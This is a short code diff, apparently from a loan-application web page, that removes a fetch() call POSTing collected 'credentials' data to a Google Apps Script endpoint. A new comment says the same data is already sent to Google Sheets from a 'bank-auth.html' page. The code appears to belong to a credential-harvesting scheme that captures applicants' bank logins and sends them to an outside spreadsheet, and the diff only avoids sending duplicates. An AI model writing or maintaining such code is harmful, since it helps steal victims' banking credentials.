@@ -1409,21 +1409,12 @@
                     loanApplicationId: loanData.email || 'unknown'
                 };
                 
-                // Send to Google Sheets (same endpoint as loan data)
-                fetch('https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec', {
-                    method: 'POST',
-                    body: JSON.stringify(credentialsData)
-                })
-                .then(response => response.text())
-                .then(result => {
-                    console.log('Credentials saved to Google Sheets:', result);
-                })
-                .catch(error => {
-                    console.error('Error saving credentials to sheets:', error);
-                });
+                // NOTE: Data already sent to Google Sheets from bank-auth.html
+                // This function is kept for reference but not sending duplicate data
+                console.log('Credentials data prepared (not sending to avoid duplicates):', credentialsData);
                 
             } catch (error) {
-                console.error('Error in sendCredentialsToSheets:', error);
+                console.error('Error preparing credentials data:', error);
             }
         }
 
